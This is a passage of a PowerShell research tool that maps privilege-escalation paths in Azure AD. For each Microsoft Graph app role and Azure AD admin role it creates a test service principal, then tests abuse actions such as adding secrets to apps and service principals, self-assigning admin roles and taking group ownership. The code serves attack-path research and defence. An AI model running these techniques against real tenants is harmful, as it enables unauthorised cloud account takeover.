New-Variable -Name 'Test-MGAddSecretToSPDefinition' -Value (Get-Command -Name "Test-MGAddSecretToSP") -Force
New-Variable -Name 'Test-MGAddSecretToSPAst' -Value (${Test-MGAddSecretToSPDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSecretToApp {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add a new secret to an app 

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to add a new secret to an app

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER TargetAppId
        The globally unique ID of the target service principal

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddSecretToSP `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetAppId "b2bf32b5-4f9d-4df2-a7d9-136d58d25482" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can add a new secret to an app registration with object ID of "b2bf32b5-4f9d-4df2-a7d9-136d58d25482"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetAppId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add a new secret to an app
    $body = @{
        passwordCredential = @{
            displayName = $TestPrincipalID
        }
    }
    $Success = $False
    Try {
        $AddAppKeyCred = Invoke-RestMethod `
            -Headers        @{Authorization = "Bearer $($TestToken)" } `
            -URI            "https://graph.microsoft.com/v1.0/applications/$($TargetAppId)/addPassword" `
            -Method         POST `
            -Body           $($body | ConvertTo-Json) `
            -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add secret to App"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSecretToAppDefinition' -Value (Get-Command -Name "Test-MGAddSecretToApp") -Force
New-Variable -Name 'Test-MGAddSecretToAppAst' -Value (${Test-MGAddSecretToAppDefinition}.ScriptBlock.Ast.Body) -Force

Function Invoke-AllAzureMGAbuseTests {
    <#
    .SYNOPSIS
        ...

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        ...

    .PARAMETER GlobalAdminClientID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER GlobalAdminSecret
        The globally unique ID of the target role eligible security group

    .PARAMETER TenantName
        The MS Graph-scoped JWT for the test service principal

    .EXAMPLE
        C:\PS> Invoke-AllAzureMGAbuseTests `
            -GlobalAdminClientID "8e955e6f-a8dd-4195-ba65-2bfcc30e253a" `
            -GlobalAdminSecret "<secret>" `
            -TenantName "specterdev.onmicrosoft.com"

        Description
        -----------
        ...

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName
        
    )

    $GlobalAdminToken = Get-MSGraphTokenWithClientCredentials `
        -ClientID       $GlobalAdminClientID `
        -ClientSecret   $GlobalAdminSecret `
        -TenantName     $TenantName

    # Create a unique identifier for this test. Abuse test Service Principal display names will start with this string.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $MGTestResults = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()

    # Get all current app roles that can be scoped against MS Graph:
    $MGRoles = Get-MGAppRoles -Token $GlobalAdminToken.access_token

    # Perform all abuse tests, creating a unique Service Principal per MS Graph app role:
    #$MGRoles | ?{$_.AppRoleValue -Match "Group"} | ForEach-Object -ThrottleLimit 50 -Parallel {
    $MGRoles | ForEach-Object -ThrottleLimit 50 -Parallel {

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
        If (-Not ${global:New-TestAppReg})                          { $ast = ${using:New-TestAppRegAst};                        ${global:New-TestAppReg} = $ast.GetScriptBlock() }
        If (-Not ${global:New-TestSP})                              { $ast = ${using:New-TestSPAst};                            ${global:New-TestSP} = $ast.GetScriptBlock() }
        If (-Not ${global:New-AppRegSecret})                        { $ast = ${using:New-AppRegSecretAst};                      ${global:New-AppRegSecret} = $ast.GetScriptBlock() }
        If (-Not ${global:New-AppRoleAssignment})                   { $ast = ${using:New-AppRoleAssignmentAst};                 ${global:New-AppRoleAssignment} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfToAADRole})                 { $ast = ${using:Test-MGAddSelfToAADRoleAst};               ${global:Test-MGAddSelfToAADRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfToMGAppRole})               { $ast = ${using:Test-MGAddSelfToMGAppRoleAst};             ${global:Test-MGAddSelfToMGAppRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfAsOwnerOfSP})               { $ast = ${using:Test-MGAddSelfAsOwnerOfSPAst};             ${global:Test-MGAddSelfAsOwnerOfSP} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfAsOwnerOfApp})              { $ast = ${using:Test-MGAddSelfAsOwnerOfAppAst};            ${global:Test-MGAddSelfAsOwnerOfApp} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddOwnerToRoleEligibleGroup})      { $ast = ${using:Test-MGAddOwnerToRoleEligibleGroupAst};    ${global:Test-MGAddOwnerToRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddMemberToRoleEligibleGroup})     { $ast = ${using:Test-MGAddMemberToRoleEligibleGroupAst};   ${global:Test-MGAddMemberToRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddOwnerToNonRoleEligibleGroup})   { $ast = ${using:Test-MGAddOwnerToNonRoleEligibleGroupAst}; ${global:Test-MGAddOwnerToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddMemberToNonRoleEligibleGroup})  { $ast = ${using:Test-MGAddMemberToNonRoleEligibleGroupAst};${global:Test-MGAddMemberToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSecretToSP})                    { $ast = ${using:Test-MGAddSecretToSPAst};                  ${global:Test-MGAddSecretToSP} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSecretToApp})                   { $ast = ${using:Test-MGAddSecretToAppAst};                 ${global:Test-MGAddSecretToApp} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadAppRegDisplayName = $(${using:TestGUID} + "-" + $_.AppRoleValue)

        # Create the test app reg:
        $ThreadSafeAppReg = (& ${global:New-TestAppReg} `
            -DisplayName $ThreadAppRegDisplayName `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the app reg to propagate before creating the SP for the app reg
        Start-Sleep 60s

        # Create the test SP:
        $ThreadSafeSP = (& ${global:New-TestSP} `
            -AppId $ThreadSafeAppReg.AppRegAppId `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the SP to propagate before creating a secret for the app reg.
        Start-Sleep 60s

        # Create a secret for the test app reg:
        $ThreadSafeSecret = (& ${global:New-AppRegSecret} `
            -AppRegObjectID $ThreadSafeAppReg.AppRegObjectID `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the secret to propagate before granting the MS Graph app role to the test app:
        Start-Sleep 60s

        # Grant the MS Graph App Role to the SP
        $MSGraphAppRoleActivation = (& ${global:New-AppRoleAssignment} `
            -SPObjectID $ThreadSafeSP.SPObjectId `
            -AppRoleID $_.AppRoleID `
            -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )

        #Wait 5 minutes for the role activation to take effect
        Start-Sleep 300s

        # Get test token
        $ThreadSafeTestToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID       $ThreadSafeSecret.AppRegAppId `
            -ClientSecret   $ThreadSafeSecret.AppRegSecretValue `
            -TenantName     "specterdev.onmicrosoft.com"
        )

        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.AppRoleValue `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.AppRoleValue `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.AppRoleValue `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetSPId         "0e0d0975-59cb-4065-9b11-e5c960617a46" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.AppRoleValue `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetAppId        "57cf2904-6741-484d-a781-2ecbb13ace62" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.AppRoleValue `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.AppRoleValue `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetAppId        "57cf2904-6741-484d-a781-2ecbb13ace62" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.AppRoleValue `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
            -TestPrincipalId $ThreadSafeSP.SPObjectId `
            -TargetSPId         "0e0d0975-59cb-4065-9b11-e5c960617a46" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.AppRoleValue `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
            -TestPrincipalId        $ThreadSafeSP.SPObjectId `
            -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
            -TestToken              $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege          $_.AppRoleValue `
            -TestGUID               ${using:TestGUID} `
            -TimeOfTest             $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfToAADRole} `
            -TestPrincipalId $ThreadSafeSP.SPObjectId `
            -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.AppRoleValue `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)
    }
    $MGTestResults

}

Function Invoke-AllAzureADAbuseTests {
    <#
    .SYNOPSIS
        ...

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Perform all abuse tests enabled by holding a particular Azure AD Admin role

    .PARAMETER GlobalAdminClientID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER GlobalAdminSecret
        The globally unique ID of the target role eligible security group

    .PARAMETER TenantName
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER AbuseTestType
        The type of abuse test you want to run. Default behavior: run all tests

    .EXAMPLE
        C:\PS> $Tests = Invoke-AllAzureADAbuseTests `
            -GlobalAdminClientID "aab7d158-7037-45f1-9ed1-e9ec0222d927" `
            -GlobalAdminSecret "<secret>" `
            -TenantName "specterdev.onmicrosoft.com"

        Description
        -----------
        ...

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName,

        [Parameter(
            Mandatory = $False,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AbuseTestType
        
    )

    $GlobalAdminToken = Get-MSGraphTokenWithClientCredentials `
        -ClientID       $GlobalAdminClientID `
        -ClientSecret   $GlobalAdminSecret `
        -TenantName     $TenantName

    # Create a unique identifier for this test. Abuse test Service Principal display names will start with this string.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $MGTestResults = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()

    # Using the Global Admin token, get the current list of available AzureAD admin role templates:
    $URI        =   'https://graph.microsoft.com/v1.0/directoryRoleTemplates'
    $Request    =   $null
    $Request    =   Invoke-RestMethod `
                        -Headers @{Authorization = "Bearer $($GlobalAdminToken.access_token)"} `
                        -URI $URI `
                        -Method GET
    $AzureADRoleTemplates = $Request.value
    
    # Using the Global Admin token, activate all the admin roles
    $AzureADRoleTemplates | ForEach-Object {
        $Role = $_
   
        $body = @{
            roleTemplateId = $Role.id
        }
        try {
            $ActivateRole = Invoke-RestMethod `
                -Uri "https://graph.microsoft.com/v1.0/directoryRoles" `
                -Headers @{Authorization = "Bearer $($GlobalAdminToken.access_token)"} `
                -Method POST `
                -ContentType 'application/json' `
                -Body $($body | ConvertTo-Json)
        }
        Catch {

        }
    }
    
    # Using my Global Admin token, get the active AzureAD roles
    $URI        =   'https://graph.microsoft.com/v1.0/directoryRoles'
    $Request    =   $null
    $Request    =   Invoke-RestMethod `
                        -Headers @{Authorization = "Bearer $($GlobalAdminToken.access_token)"} `
                        -URI $URI `
                        -Method GET
    $AzureADRoles = $Request.value

    # Perform all abuse tests, creating a unique Service Principal per Azure AD admin role:
    #$MGRoles | ?{$_.AppRoleValue -Match "RoleManagement"} | ForEach-Object -ThrottleLimit 50 -Parallel {
    $AzureADRoles | ForEach-Object -ThrottleLimit 50 -Parallel {

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
        If (-Not ${global:New-TestAppReg})                          { $ast = ${using:New-TestAppRegAst};                        ${global:New-TestAppReg} = $ast.GetScriptBlock() }
        If (-Not ${global:New-TestSP})                              { $ast = ${using:New-TestSPAst};                            ${global:New-TestSP} = $ast.GetScriptBlock() }
        If (-Not ${global:New-AppRegSecret})                        { $ast = ${using:New-AppRegSecretAst};                      ${global:New-AppRegSecret} = $ast.GetScriptBlock() }
        If (-Not ${global:New-AppRoleAssignment})                   { $ast = ${using:New-AppRoleAssignmentAst};                 ${global:New-AppRoleAssignment} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfToAADRole})                 { $ast = ${using:Test-MGAddSelfToAADRoleAst};               ${global:Test-MGAddSelfToAADRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfToMGAppRole})               { $ast = ${using:Test-MGAddSelfToMGAppRoleAst};             ${global:Test-MGAddSelfToMGAppRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfAsOwnerOfSP})               { $ast = ${using:Test-MGAddSelfAsOwnerOfSPAst};             ${global:Test-MGAddSelfAsOwnerOfSP} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSelfAsOwnerOfApp})              { $ast = ${using:Test-MGAddSelfAsOwnerOfAppAst};            ${global:Test-MGAddSelfAsOwnerOfApp} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddOwnerToRoleEligibleGroup})      { $ast = ${using:Test-MGAddOwnerToRoleEligibleGroupAst};    ${global:Test-MGAddOwnerToRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddMemberToRoleEligibleGroup})     { $ast = ${using:Test-MGAddMemberToRoleEligibleGroupAst};   ${global:Test-MGAddMemberToRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddOwnerToNonRoleEligibleGroup})   { $ast = ${using:Test-MGAddOwnerToNonRoleEligibleGroupAst}; ${global:Test-MGAddOwnerToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddMemberToNonRoleEligibleGroup})  { $ast = ${using:Test-MGAddMemberToNonRoleEligibleGroupAst};${global:Test-MGAddMemberToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSecretToSP})                    { $ast = ${using:Test-MGAddSecretToSPAst};                  ${global:Test-MGAddSecretToSP} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-MGAddSecretToApp})                   { $ast = ${using:Test-MGAddSecretToAppAst};                 ${global:Test-MGAddSecretToApp} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadAppRegDisplayName = $(${using:TestGUID} + "-" + $_.displayName)

        # Create the test app reg:
        $ThreadSafeAppReg = (& ${global:New-TestAppReg} `
            -DisplayName $ThreadAppRegDisplayName `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the app reg to propagate before creating the SP for the app reg
        Start-Sleep 60s

        # Create the test SP:
        $ThreadSafeSP = (& ${global:New-TestSP} `
            -AppId $ThreadSafeAppReg.AppRegAppId `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the SP to propagate before creating a secret for the app reg.
        Start-Sleep 60s

        # Create a secret for the test app reg:
        $ThreadSafeSecret = (& ${global:New-AppRegSecret} `
            -AppRegObjectID $ThreadSafeAppReg.AppRegObjectID `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the secret to propagate before granting the MS Graph app role to the test app:
        Start-Sleep 60s

        # Grant the AzureAD admin role to the test service principal
        $body = @{
            "@odata.id" =  "https://graph.microsoft.com/v1.0/directoryObjects/$($ThreadSafeSP.SPObjectId)"
        }
        $GrantRole = Invoke-RestMethod -Headers @{Authorization = "Bearer $($ThreadSafeGlobalAdminToken.access_token)" } `
            -Uri "https://graph.microsoft.com/v1.0/directoryRoles/$($_.id)/members/`$ref" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'

        #Wait 5 minutes for the role activation to take effect
        Start-Sleep 300s

        # Get test token
        $ThreadSafeTestToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID       $ThreadSafeSecret.AppRegAppId `
            -ClientSecret   $ThreadSafeSecret.AppRegSecretValue `
            -TenantName     "specterdev.onmicrosoft.com"
        )

        Switch (${using:AbuseTestType}) {

            MGAddOwnerToRoleEligibleGroup {
                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSecretToSP {
                $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetSPId         $ThreadSafeSP.SPObjectId `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSecretToApp {
                $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddMemberToRoleEligibleGroup {
                $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSelfAsOwnerOfApp {
                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddOwnerToNonRoleEligibleGroup {
                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddMemberToNonRoleEligibleGroup {
                $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSelfAsOwnerOfSP {
                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
                    -TestPrincipalId $ThreadSafeSP.SPObjectId `
                    -TargetSPId         "09b51dd2-c780-4492-994a-1cbce1d66719" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSelfToMGAppRole {
                $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
                    -TestPrincipalId        $ThreadSafeSP.SPObjectId `
                    -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
                    -TestToken              $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege          $_.displayName `
                    -TestGUID               ${using:TestGUID} `
                    -TimeOfTest             $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSelfToAADRole {
